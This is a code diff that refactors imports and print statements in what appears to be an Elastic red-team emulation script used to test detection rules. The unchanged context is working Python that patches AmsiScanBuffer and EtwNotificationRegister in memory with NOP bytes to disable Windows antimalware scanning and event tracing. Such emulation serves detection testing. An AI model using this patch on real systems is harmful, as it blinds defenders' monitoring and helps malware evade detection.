@@ -3,7 +3,11 @@
 # 2.0; you may not use this file except in compliance with the Elastic License
 # 2.0.
 
-from . import _common, RuleMetadata, register_code_rta, OSType
+import logging
+
+from . import OSType, register_code_rta
+
+log = logging.getLogger(__name__)
 
 
 @register_code_rta(
@@ -18,7 +22,8 @@ from . import _common, RuleMetadata, register_code_rta, OSType
     techniques=["T1562.001"],
 )
 def main():
-    import ctypes, platform
+    import ctypes
+    import platform
     from ctypes import windll, wintypes
 
     kernel32 = windll.kernel32
@@ -50,10 +55,10 @@ def main():
     OLD_PROTECTION = wintypes.LPDWORD(ctypes.c_ulong(0))
 
     if platform.architecture()[0] == "64bit":
-        print(f"[+] using x64 based patch")
+        print("[+] using x64 based patch")
         patch = (ctypes.c_char * 6)(0x90, 0x90, 0x90, 0x90, 0x90, 0x90)
     if platform.architecture()[0] != "64bit":
-        print(f"[+] using x86 based patch")
+        print("[+] using x86 based patch")
         patch = (ctypes.c_char * 8)(0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90)
 
     lib = LoadLibraryA(b"amsi.dll")
@@ -69,10 +74,10 @@ def main():
     amsi_rwx = VirtualProtect(amsi, ctypes.sizeof(patch), RWX, OLD_PROTECTION)
     etw_rwx = VirtualProtect(etw, ctypes.sizeof(patch), RWX, OLD_PROTECTION)
     if amsi_rwx and etw_rwx:
-        print(f"[+] Changed Proctection of AmsiScanBuffer and EtwNotificationRegister to RWX")
+        print("[+] Changed Proctection of AmsiScanBuffer and EtwNotificationRegister to RWX")
 
     c_null = ctypes.c_int(0)
     amsi_bypass = WriteProcessMemory(GetCurrentProcess(), amsi, patch, ctypes.sizeof(patch), ctypes.byref(c_null))
     etw_bypass = WriteProcessMemory(GetCurrentProcess(), etw, patch, ctypes.sizeof(patch), ctypes.byref(c_null))
     if amsi_bypass and etw_bypass:
-        print(f"[*] RTA Done - Patched AmsiScanBuffer & EtwNotificationRegister!")
+        print("[*] RTA Done - Patched AmsiScanBuffer & EtwNotificationRegister!")
